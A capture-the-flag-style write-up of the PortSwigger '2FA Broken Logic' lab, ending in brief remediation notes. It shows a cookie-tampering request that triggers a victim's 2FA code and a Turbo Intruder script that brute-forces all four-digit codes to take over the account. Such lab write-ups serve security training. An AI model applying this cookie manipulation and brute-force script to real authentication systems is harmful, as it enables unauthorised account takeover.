---
layout: post
title: "PortSwigger Lab: 2FA Broken Logic"
date: 2025-08-06
categories:
  [
    "PortSwigger",
    "Practice",
    "Authentication Vulnerabilities",
    "Vulnerabilities in multi-factor authentication",
  ]
tags:
  - "PortSwigger"
  - "Authentication Vulnerabilities"
  - "Vulnerabilities in multi-factor authentication"
  - "2FA"
  - "Logic Flaws"
  - "Brute-Force"
  - "Turbo Intruder"
  - "Burp Suite"
---

# PortSwigger Lab: 2FA Broken Logic

# Table of Contents

- [Overview / Goal](#overview--goal)
- [Lab Setup and Tools](#lab-setup-and-tools)
- [Solution Steps](#solution-steps)
- [What I'd Do Next (Blue Team)](#what-id-do-next)
- [Try This Lab Yourself](#try-this-lab-yourself)

---

# Overview / Goal {#overview--goal}

> "This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page."
>
> Your credentials: `wiener:peter`
> Victim's username: `carlos`
>
> "You also have access to the email server to receive your 2FA verification code."

The first thing I noticed is that the lab Hint said:

> **Carlos will not attempt to log in to the website himself.**

That probably means I'll never need to find Carlos's password. Whatever the vulnerability is, it's in the 2FA flow.

# Lab Setup and Tools {#lab-setup-and-tools}

- Burp Suite + Firefox (through FoxyProxy)
- Turbo Intruder extension

---

# Solution Steps {#solution-steps}

**1) Normal 2FA Flow**

I started by logging in with my given creds `wiener:peter`.

After entering the username and password, I got the 2FA prompt. I opened the emulated email client, copied the code, pasted it in, and logged in successfully.

Nothing unexpected so far.

**2) Inspecting the 2FA Request**

While logged in, I checked Burp's Proxy HTTPS history and noticed a request to `/login2`:

```http
GET /login2 HTTP/2
Host: 0aa6003304fa33f7801930d300980098.web-security-academy.net
Cookie: session=0yI9369ul994nbhhyZ30GREj68nnmB2z; verify=wiener
Referer: https://0aa6003304fa33f7801930d300980098.web-security-academy.net/login
```

The `verify` cookie caught my attention.

So I thought, what happens if I replay this request again, delete the session, and just change the username?

**3) Forcing Carlos's 2FA**

I sent this request in Repeater:

```http
GET /login2 HTTP/2
Host: 0aa6003304fa33f7801930d300980098.web-security-academy.net
Cookie: verify=carlos
```

And it worked.

The response rendered the 2FA prompt for **Carlos's account**.

That means a 2FA code was _Probably_ (hopefully) just sent to Carlos's email inbox. THAT means that a 2FA code exists for this login and is waiting to be used. 😈

**4) Brute-Forcing the 2FA Code**

As far as I know, this lab is impossible to solve with the Burp Suit Community Edition without using the Turbo Intruder extension.
So, I whipped up Turbo Intruder and started the brute force process for the 2FA.

From the request I got earlier from my first personal login attempt `POST /login2 HTTP/2` I right clicked it and sent it to Turbo Intruder looking like this:

```http
POST /login2 HTTP/2
Host: 0aa6003304fa33f7801930d300980098.web-security-academy.net

Cookie: verify=carlos

Origin: https://0aa6003304fa33f7801930d300980098.web-security-academy.net
Referer: https://0aa6003304fa33f7801930d300980098.web-security-academy.net/login2

mfa-code=%s
```

And I made this script:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           engine=Engine.BURP2
                           )
    for i in range(10000):
        engine.queue(target.req, '%04d' % i)
def handleResponse(req, interesting):
    if interesting:
        table.add(req)
```

Every response returned status code `200` except one.

The code **0469** returned a **302**.

**5) Done**

I right-clicked that response, selected **Open response in browser**, and the account page loaded.

Lab solved. ✅

---

# What I'd Do Next (Blue Team) {#what-id-do-next}

- Enforce stricter server-side checks.
- Bind 2FA challenges to an authenticated session and user identity.

---

# Try This Lab Yourself {#try-this-lab-yourself}

🔗 Lab Link: [PortSwigger Lab: 2FA Broken Logic](https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-multi-factor-authentication/authentication/multi-factor/lab-2fa-broken-logic){:target="\_blank"}
